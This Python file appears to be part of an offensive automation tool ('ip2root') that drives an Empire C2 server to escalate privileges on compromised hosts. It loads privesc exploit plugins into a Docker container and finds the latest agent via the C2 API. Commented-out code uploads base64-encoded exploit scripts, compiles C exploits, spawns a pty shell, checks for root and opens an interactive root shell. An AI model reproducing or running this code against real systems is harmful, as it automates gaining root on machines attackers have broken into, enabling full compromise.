import os
import json
import docker
import requests
import subprocess
from time import sleep
from datetime import datetime, timezone, timedelta

def plugins(container_id: str, token: str, ip: str):
    '''
    Initial function to create plugins directory if it doesn't exist
    '''
    print('[+] Attemtping to privesc')
    client = docker.from_env()
    empire_container = client.containers.get(container_id)
    check_plugin_directory = empire_container.exec_run('ls /plugins')
    if check_plugin_directory.exit_code == 2:
        empire_container.exec_run('mkdir /plugins')
        plugins_liste = list_plugins()
        load_plugins(plugins_liste, empire_container, container_id)
    id = get_agent_name(token, ip)
    test_plugins(empire_container, token, id)
        
def list_plugins():
    '''
    List privesc plugins in ip2root's git repo
    '''
    plugins_liste = []
    directory = './plugins/privesc/'
    for filename in os.listdir(directory):
        f = os.path.join(directory, filename)
        if os.path.isfile(f):
            plugins_liste.append(f)
    return plugins_liste

def load_plugins(plugins_liste: str, empire_container: object, container_id: str):
    '''
    Copy plugins in the docker
    '''
    empire_container.exec_run('rm /plugins/*')
    for plugin in plugins_liste:
        os.system('docker cp {0} {1}:/plugins/'.format(plugin, container_id))

def get_agent_name(token: str, ip: str):
    '''
    Get agent name from C2
    '''
    sleep(10)
    url_agents = 'https://localhost:1337/api/agents?token={0}'.format(token)
    r_agents = requests.get(url_agents, verify=False)
    resultats = json.loads(r_agents.text)
    time_last_agent = datetime.fromisoformat(resultats['agents'][len(resultats['agents']) -1]['checkin_time'])
    now = datetime.now(timezone.utc)

    delta = datetime.strptime(str(abs(now - time_last_agent)), "%H:%M:%S.%f") 
    thirty = timedelta(seconds=30)

    duration = timedelta(hours=delta.hour, minutes=delta.minute, seconds=delta.second, microseconds=delta.microsecond)

    if duration < thirty:
        return resultats['agents'][len(resultats['agents']) -1]['session_id']
    else:
        print('[-] Could not find the agent in the C2, try again.')
        exit()
    
def test_plugins(empire_container: object, token: str, id: str):
    '''
    Test the privesc
    '''
    directory = './plugins/privesc/'
    counter = 1
    for filename in os.listdir(directory):
        f = os.path.join(directory, filename)
        if os.path.isfile(f):
            print('[+] Uploading {} on the target'.format(f))
            # Won't work because not a real shell in the C2
            '''
            exploit = subprocess.check_output('cat {0} | base64'.format(f), shell=True)
            # Send system cmd to agent
            url = 'https://localhost:1337/api/agents/{0}/shell?token={1}'.format(id, token)
            header = {"Content-Type": "application/json"}
            param = {"command":"""echo {0} | base64 -d > /tmp/exploit{1}.sh && chmod +x /tmp/exploit{1}.sh && python3 -c 'import pty; pty.spawn("/bin/bash") && /tmp/exploit{1}.sh""".format((exploit.decode('utf-8')).replace('\n', ''), counter)}
            
            param = {"command":"""echo {0} | base64 -d > /tmp/exploit{1}.sh""".format((exploit.decode('utf-8')).replace('\n', ''), counter)}
            requests.post(url, headers=header, json=param, verify=False)
            sleep(10)
            param = {"command":"whoami"}
            requests.post(url, headers=header, json=param, verify=False)
            sleep(20)
            
            # Get result
            url_res = 'https://localhost:1337/api/agents/{0}/results?token={1}'.format(id, token)
            r_res = requests.get(url_res, headers=header, verify=False)
            resultats = json.loads(r_res.text)
            print(resultats['results'][0]['AgentResults'][len(resultats['results'][0]['AgentResults']) - 1]['results'])
            
            counter += 1
            '''

'''def load_all_plugins(sock: rs_client.Socket, shell: rs_client.Shell, compromission_recap_file_name: str) -> None:
    """
    Run all available privesc plugins
    """
    print('[+] Identifying privesc capabilities')
    directory = './plugins/privesc/'
    counter = 1
    for filename in os.listdir(directory):
        f = os.path.join(directory, filename)
        if os.path.isfile(f):
            print('[+] Uploading privesc script number {}'.format(counter))
            rsh = rs_client.RSH(sock)
            if '.sh' in f:
                ext = '.sh'
            elif '.c' in f:
                ext = '.c'
            rsh.upload('{0}'.format(f), '/tmp/exploit{0}{1}'.format(counter, ext))
            sock.send('cd /tmp\n')
            if ext == '.c':
                sock.send('gcc exploit{0}{1} -o exploit{0}\n'.format(counter, ext))
                sock.send('chmod +x /tmp/exploit{0}{1}\n'.format(counter, ext))
                sock.send('./exploit{0}\n'.format(counter, ext))
            elif ext == '.sh':
                sock.send('chmod +x /tmp/exploit{0}{1}\n'.format(counter, ext))
                sock.send("""python3 -c 'import pty; pty.spawn("/bin/bash")'\n""")
                sock.send('./exploit{0}{1}\n'.format(counter, ext))
            sock.send("""/bin/sh -c '[ "$(id)" = "uid=0(root) gid=0(root) groups=0(root)" ] && touch /tmp/valid_root'\n""")
            sleep(2)
            if rsh.file_exists('/tmp/valid_root') == True:
                print('[+] Privesc exploit worked !')
                if compromission_recap_file_name:
                    with open(compromission_recap_file_name, 'a') as report:
                        report.write('## Vulnerability used for privilege escalation\n`{}`\n'.format(f.split('/')[-1][:-3]))
                sleep(2)
                sock.send('rm /tmp/valid_root\n')
                sock.send('rm /tmp/exploit{0}{1}\n'.format(counter, ext))
                shell.interact()
                sock.close()
                print('before if')
            else:
                print("")
                sock.send('rm /tmp/exploit*\n') 
            counter += 1'''